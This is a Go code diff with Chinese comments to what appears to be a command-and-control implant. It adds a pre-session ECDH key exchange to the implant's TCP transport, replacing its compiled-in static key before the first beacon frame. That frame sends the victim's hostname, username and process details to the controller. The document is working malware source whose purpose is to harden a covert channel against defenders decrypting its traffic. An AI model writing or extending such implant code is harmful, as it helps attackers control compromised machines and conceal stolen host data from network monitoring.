@@ -3,10 +3,11 @@
 package main
 
 import (
+	"encoding/binary"
 	"fmt"
 	"implant/core/app"
-	"implant/core/debuglog"
 	"implant/core/communication"
+	"implant/core/debuglog"
 	"implant/core/encrypt"
 	"implant/core/reconnect"
 	"implant/core/utils"
@@ -15,7 +16,6 @@ import (
 	"time"
 )
 
-
 // TCPClient 实现 communication.Transport（TCP 持久传输）。
 type TCPClient struct {
 	Client       *net.TCPConn
@@ -23,7 +23,7 @@ type TCPClient struct {
 	connectStart time.Time
 	connected    bool
 	stopCh       chan struct{} // 心跳 goroutine 退出信号
-	sendMutex    sync.Mutex   // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
+	sendMutex    sync.Mutex    // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
 }
 
 // NewTransport 构造 TCP 传输（单二进制 build tag 入口）
@@ -70,6 +70,57 @@ func (s *TCPClient) closeClientLocked() {
 	}
 }
 
+// kxMsgType 与 service 端 connection/tcp.MsgTypeKX 一致（200）。
+// 分帧沿用 len(4)|msgType(4)|payload，payload = base64(公钥)。
+const kxMsgType = 200
+
+// kxHandshake 会话前密钥交换：发 KX 帧（客户端公钥），收 KX 帧（服务端公钥），
+// 派生主密钥并替换编译期静态主密钥。
+//
+// 失败一律静默返回（不返回 error）：交换失败应与"服务端不支持 ECDH"表现一致，
+// 走静态密钥继续，而不是让整条传输起不来。真正的"必须 ECDH"由部署侧策略决定。
+func (s *TCPClient) kxHandshake() {
+	kx, err := encrypt.NewKeyExchange()
+	if err != nil {
+		return
+	}
+	// 发：msgType(4) | b64(clientPub)
+	if err := s.rawSend(utils.BytesCombine(utils.WriteInt(kxMsgType), []byte(kx.HeaderValue()))); err != nil {
+		return
+	}
+	// 收：len(4) | msgType(4) | b64(serverPub)
+	if err := s.Client.SetReadDeadline(time.Now().Add(app.RecvDeadline())); err != nil {
+		return
+	}
+	total, err := communication.ReadFramedLength(s.Client)
+	if err != nil || total < 8 {
+		return
+	}
+	payload, err := communication.ReadFramedPayload(s.Client, total)
+	if err != nil || len(payload) < 4 {
+		return
+	}
+	if int(binary.BigEndian.Uint32(payload[:4])) != kxMsgType {
+		// 服务端没按 KX 回帧：可能是不支持，放弃交换
+		return
+	}
+	peerPub, err := encrypt.ParsePeerPublicKey(string(payload[4:]))
+	if err != nil {
+		return
+	}
+	salt, _ := app.GetListenerKeyConfig(listenerType)
+	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
+	if err != nil {
+		return
+	}
+	if err := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); err != nil {
+		return
+	}
+	// 旧的 MetaInfo 是用静态密钥生成的，必须重建
+	utils.MetaInfo = nil
+	debuglog.Printf("🔑 [TCP-KX] 会话前密钥交换完成，已替换静态主密钥\n")
+}
+
 // Connect 拨号 + FirstBlood + 会话密钥 + 心跳。
 func (s *TCPClient) Connect(host string) error {
 	s.connectStart = time.Now()
@@ -93,6 +144,11 @@ func (s *TCPClient) Connect(host string) error {
 	conn.SetKeepAlivePeriod(30 * time.Second)
 	s.Client = conn
 	s.connected = true
+
+	// 会话前 ECDH 交换（必须在生成 MetaInfo 之前：MetaInfo 含主机名/用户名/进程，
+	// 先加密再交换的话首帧仍会被静态密钥解开）。失败时 s.kxDone=false，
+	// 后续照旧走静态密钥 —— 老服务端不会因此失联。
+	s.kxHandshake()
 
 	// MetaInfo + FirstBlood
 	if len(utils.MetaInfo) == 0 {
@@ -127,7 +183,7 @@ func (s *TCPClient) StartHeartbeat() {
 		close(s.stopCh)
 	}
 	s.stopCh = make(chan struct{})
-stop := s.stopCh
+	stop := s.stopCh
 	go app.HeartbeatLoop(stop, s.keepAlive)
 }
 
